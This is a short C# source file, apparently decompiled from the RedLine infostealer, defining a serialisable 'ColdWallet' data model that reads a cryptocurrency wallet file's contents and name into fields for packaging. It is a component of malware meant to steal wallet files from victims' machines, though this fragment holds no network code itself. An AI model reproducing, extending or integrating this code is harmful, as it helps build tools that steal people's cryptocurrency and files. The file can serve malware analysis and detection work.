using System.IO;
using System.Linq;
using System.Runtime.Serialization;

namespace RedLine.Reburn.Models.Info;

[DataContract(Name = "ColdWallet", Namespace = "v1/Models")]
public class ColdWallet
{
	[DataMember(Name = "FileInfoName")]
	public string FileInfoName { get; set; }

	[DataMember(Name = "FileBody")]
	public byte[] FileBody { get; set; }

	[DataMember(Name = "FileWltName")]
	public string FileWltName { get; set; }

	[DataMember(Name = "FileWalletDir")]
	public string FileWalletDir { get; set; }

	public ColdWallet()
	{
	}

	public ColdWallet(string filepath)
	{
		FileBody = File.ReadAllBytes(filepath);
		FileInfoName = filepath.Split(new char[1] { '\\' }).Last();
	}
}
